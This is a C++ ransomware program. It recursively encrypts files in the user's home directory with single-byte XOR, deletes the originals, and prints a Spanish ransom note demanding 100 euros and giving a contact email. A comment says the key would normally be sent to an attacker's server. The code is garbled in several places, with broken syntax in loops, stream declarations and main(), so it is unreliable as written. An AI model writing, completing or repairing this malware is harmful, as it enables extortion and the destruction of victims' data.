#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <random>
#include <iomanip>
#include <sstream>

namespace fs = std::filesystem;

    string generate_key() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    std::string key(16, ' ');
    for (auto& c key) {
        c = static_cast<char>(dis(gen));
    }
    return key;
}

void encrypt_file(const std::string& file_path, const std::string& key) {
    std::ifstream input_file(file_path, std::ios::binary);
    std::stream output_file(file_path + ".enc", std::ios::binary);

    if (!input_file || !output_file) {
        std::cerr << "Error opening file: " << file_path << std::endl;
        return;
    }

    char c;
    while (input_file.get)) {
        c ^= key[0]; // Simple XOR encryption
        output_file.put(c);
    }

    input_file.close();
    output_file.close();

    std::remove(file_path.c_str());
}

void decrypt_file(const std::string& file_path, const std::string&) {
    std::ifstream input_file(file_path, std::ios::binary);
    std::ofstream output_file(file_path.substr(0, file_path.size() - 4), std::ios::binary);

    if (!input_file || !output_file) {
        std:: << "Error opening file: " << file_path << std::endl;
        return;
    }

    char c;
    while (input_file.get(c)) {
        c ^= key[0]; // Simple XOR decryption
        output_file.put(c);
    }

    input_file.close    output_file.close();

    std::remove(file_path.c_str());
}

void encrypt_directory(const std::string& directory_path, const std::string& key) {
    for (const auto& entry : fs::directory_iterator(directory_path)) {
        if (fs::is_regular_file.path())) {
            encrypt_file(entry.path().string(), key);
        } else if (fs::is_directory(entry.path())) {
            encrypt_directory(entry.path().string(), key);
        }
    }
}

void show_ransom_note() {
    std::cout << "--------------------------------------------------" <<::endl;
    std::cout << "    Tus archivos han sido cifrados.               " << std::endl;
    std::cout << "    Para recuperar tus archivos, paga 100 euros.  " << std::endl;
    std::cout << "    Contacta cotroneosalvador@gmail.com para   " << std::endl;
    std::cout << "    obtener la clave de descifrado.               " << std::endl;
    std::cout << "--------------------------------------------------" << std::endl;
}

int main() {
    std::string = generate_key();
    std::string user_directory = fs::path.home().string();

    encrypt_directory(user_directory, key);

    show_ransom_note();

    // Save the key to a file for decryption (in a real scenario, this would be sent to the attacker's server    std::ofstream key_file("decryption_key.txt");
    if (key_file.is_open()) {
        key_file << key;
        key_file.close();
    }

    return 0;
}